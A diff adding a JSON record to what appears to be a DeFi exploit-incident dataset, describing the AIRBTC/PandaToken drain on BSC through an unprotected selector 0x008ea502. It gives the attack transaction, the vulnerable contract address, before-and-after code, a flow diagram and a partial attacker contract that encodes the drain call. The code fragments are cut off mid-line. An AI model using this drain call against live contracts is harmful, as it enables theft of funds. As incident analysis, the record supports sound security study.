@@ -1,0 +1,32 @@
+{
+ "id": "2024__2024-09-05_AIRBTC_CustomSelectorDrain",
+ "source_file": "2024/2024-09-05_AIRBTC_CustomSelectorDrain.md",
+ "title": "AIRBTC (PandaToken) — LP Pool Balance Drain via Custom Selector Analysis",
+ "date": "2024-09-05",
+ "protocol": "AIRBTC / PandaToken",
+ "chain": "BSC",
+ "loss_raw": "~6,800 USD",
+ "loss_usd": null,
+ "root_cause": "Token drain via selector 0x008ea502 — allows moving external tokens without an internal balance",
+ "attack_tx": "0x00e4bbc86369d67e21b1910c4f9178c8257ce96192039a7839bd4d3593e1cd27",
+ "vulnerable_contract": "0x12050e4355a392162698c6cf30eb8c9e0777300d",
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: selector 0x008ea502 — token transfer with no access control\n// Parameters: (uint256 offset, uint256 amount, address recipient, uint256 flags, bytes32 tag)\nfunction execute(uint256 offset, uint256 amount, address recipient, uint256 flags, bytes32 tag) external {\n    //",
+  "❌ No caller validation — anyone can move tokens held in the vulnerable contract\n    IERC20(targetToken).transfer(recipient, amount);\n}\n\n//",
+  "// File: AIRBTC_decompiled.sol\ncontract AIRBTC {\n    function balanceOf(address p0) external view returns (uint256) {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Fixed code: access control added\nfunction execute(uint256 offset, uint256 amount, address recipient, uint256 flags, bytes32 tag) external {\n    require(msg.sender == authorizedCaller, \"Not authorized\");  //",
+  "✅ Restrict caller\n    require(amount <= withdrawLimit, \"Exceeds limit\");          //"
+ ],
+ "steps": [
+  "[3] ► Swap PandaToken → USDT via PancakeRouter"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─► Query PandaToken balance held in vulnerable contract\n  │         └─► PandaToken.balanceOf(addr=0x12050e) = X\n  │\n  ├─[2]─► Call selector 0x008ea502\n  │         └─► abi.encodeWithSelector(0x008ea502, 96, X, address(this), 3, 0x4149520...)\n  │         └─► Move entire balance to AttackerContract\n  │\n  ├─[3]─► Swap PandaToken → USDT via PancakeRouter\n  │         └─► swapExactTokensForTokensSupportingFeeOnTransferTokens\n  │\n  └─[4]─► Total loss: ~6,800 USD",
+  "contract AddrCC {\n    function process(address tokenIn, address tokenOut) external {\n        // [1] Query PandaToken balance held in the vulnerable contract\n        (bool ok1, bytes memory ret1) = tokenIn.staticcall(\n            abi.encodeWithSelector(IERC20(tokenIn).balanceOf.selector, addr)\n        );\n        uint256 bal = abi.decode(ret1, (uint256));\n\n        // [2] Drain tokens via selector 0x008ea502\n        bytes memory data = abi.encodeWithSelector(\n            bytes4(0x008ea502),\n            uint256(96),           // offset\n            bal,                   // amount: full balance\n            address(this),         // recipient: attacker\n            uint256(3),            // flags\n            bytes32(hex\"4149520000000000000000000000000000000000000000\")  // tag: \"AIR\"\n        );\n  "
+ ]
+}
